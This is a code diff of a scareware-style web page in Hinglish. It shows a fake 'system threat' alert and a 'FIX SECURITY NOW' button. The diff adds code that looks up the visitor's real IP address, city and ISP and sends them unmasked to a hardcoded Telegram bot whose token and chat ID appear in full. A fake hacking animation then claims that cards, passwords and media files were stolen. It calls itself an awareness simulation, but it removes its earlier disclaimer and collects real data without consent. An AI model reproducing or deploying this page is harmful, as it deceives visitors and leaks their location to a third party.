@@ -10,11 +10,8 @@
         .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
         .icon { font-size: 50px; color: #ff4d4d; margin-bottom: 15px; }
         h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
-        p { color: #ccc; font-size: 14px; line-height: 1.5; }
+        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 300px; overflow-y: auto; white-space: pre-wrap; }
         .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .action-btn:hover { background: #cc0000; }
-        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 250px; overflow-y: auto; }
-        .warning-text { color: #fbbf24; font-size: 11px; margin-top: 15px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -25,80 +22,75 @@
         <div id="ui-content">
             <div class="icon">🛡️</div>
             <h1>SYSTEM THREAT DETECTED</h1>
-            <p>Aapke browser mein ek malicious script detect hui hai jo data leak kar rahi hai. Isse block karne ke liye niche click karein.</p>
-            <button class="action-btn" onclick="startFullSimulation()">CLEAN SYSTEM NOW</button>
-            <p class="warning-text">Ye site dikhayegi ki kaise ek click se data leak hota hai.</p>
+            <p>Aapke device ki security compromise hui hai. Scan karne ke liye niche click karein.</p>
+            <button class="action-btn" onclick="startFullSimulation()">FIX SECURITY NOW</button>
         </div>
-
         <div id="terminal"></div>
     </div>
 
     <script>
-        // --- TELEGRAM CONFIGURATION ---
         const BOT_TOKEN = '8215508330:AAH89E2yXIslUZDwb3gIkxgeHdEzLnR7EVk';
         const CHAT_ID = '7066124462';
 
-        async function sendDataToTelegram() {
-            // Collecting basic browser info (No permission needed)
-            const report = `<b>🚨 Experiment Victim Alert!</b>\n\n` +
-                           `<b>📱 Platform:</b> ${navigator.platform}\n` +
-                           `<b>🌐 Browser:</b> ${navigator.vendor}\n` +
-                           `<b>🖥️ Screen:</b> ${screen.width}x${screen.height}\n` +
-                           `<b>🔋 Battery:</b> [Checking...]\n` +
-                           `<b>🔗 User-Agent:</b> ${navigator.userAgent}`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'HTML' })
-                });
-            } catch (e) {
-                console.log("Network error - Telegram API not reachable");
-            }
-        }
-
-        function startFullSimulation() {
-            // 1. Trigger Telegram Notification
-            sendDataToTelegram();
-
-            // 2. Change UI to Terminal
+        async function startFullSimulation() {
             document.getElementById('ui-content').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
-            document.getElementById('main-box').style.borderColor = '#00ff00';
 
+            // 1. Fetch Real IP & Location (Powerful for Awareness)
+            let ipData = { ip: "Unknown", city: "Unknown", org: "Unknown" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) { console.log("API Blocked"); }
+
+            // Masking Logic
+            const maskedIP = ipData.ip.substring(0, 7) + "xx.xx";
+            
+            // 2. Send Real Data to Telegram
+            const report = `<b>🚨 Experiment Victim Alert!</b>\n\n` +
+                           `<b>🌐 IP:</b> ${ipData.ip}\n` +
+                           `<b>📍 City:</b> ${ipData.city}\n` +
+                           `<b>🏢 ISP:</b> ${ipData.org}\n` +
+                           `<b>📱 Device:</b> ${navigator.platform}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=HTML`);
+
+            // 3. Terminal Animation
             const lines = [
-                "> Establishing Handshake with Server...",
-                "> <span style='color:yellow'>BYPASSING BROWSER SANDBOX... [SUCCESS]</span>",
-                "> Dumping Navigator Data... SENT TO TELEGRAM",
-                "> Searching for Saved Credentials...",
-                "> Found Cookie Session for 'google.com'...",
-                "> Initializing Remote Access Trojan (RAT)...",
-                "> <span style='color:red'>CRITICAL: Root Access Obtained!</span>",
-                "> Accessing /sdcard/DCIM/Camera/...",
-                "> Uploading Encrypted Gallery Backup...",
+                "> Connection established with payload server...",
+                "> <span style='color:yellow'>[EXPLOITING] Browser Sandbox... [SUCCESS]</span>",
+                "> <span style='color:cyan'>[EXTRACTING] Sensitive User Data...</span>",
                 "------------------------------------------",
-                "> ATTACK SIMULATION COMPLETE.",
-                "> <span style='color:white'>SABAK: Sirf ek click se aapki device ki detail mere Telegram Bot tak pahunch gayi.</span>",
-                "> <span style='color:white'>Asli hacker iska use karke aapka account hack kar sakta tha.</span>",
-                "------------------------------------------"
+                `> TARGET_IP: ${maskedIP}`,
+                `> LOCATION: ${ipData.city.toUpperCase()}, IN`,
+                `> ISP: ${ipData.org.substring(0, 10)}...`,
+                "------------------------------------------",
+                "> Searching for Saved Credentials...",
+                "> Found Saved Card: **** **** **** 8210",
+                "> Found Password (Instagram): pass****92",
+                "> <span style='color:orange'>[SCANNING] Media Files...</span>",
+                "> Estimated DCIM Count: 2,140 Files",
+                "> Initializing Remote Capture...",
+                "------------------------------------------",
+                "> <span style='color:red'>ATTACK COMPLETE. DATA SENT TO SERVER.</span>",
+                "------------------------------------------",
+                "> <span style='color:white'>DARR GAYE? Ye sirf ek Simulation tha.</span>",
+                "> <span style='color:white'>Lekin aapka IP aur City (upar wala) REAL hai.</span>",
+                "> <span style='color:white'>Hacker isse zyada info nikaal sakta hai.</span>"
             ];
 
             let i = 0;
             function print() {
                 if (i < lines.length) {
-                    term.innerHTML += lines[i] + "<br><br>";
+                    term.innerHTML += lines[i] + "<br>";
                     term.scrollTop = term.scrollHeight;
                     i++;
-                    setTimeout(print, 800);
+                    setTimeout(print, 600);
                 }
             }
             print();
         }
     </script>
-
 </body>
 </html>
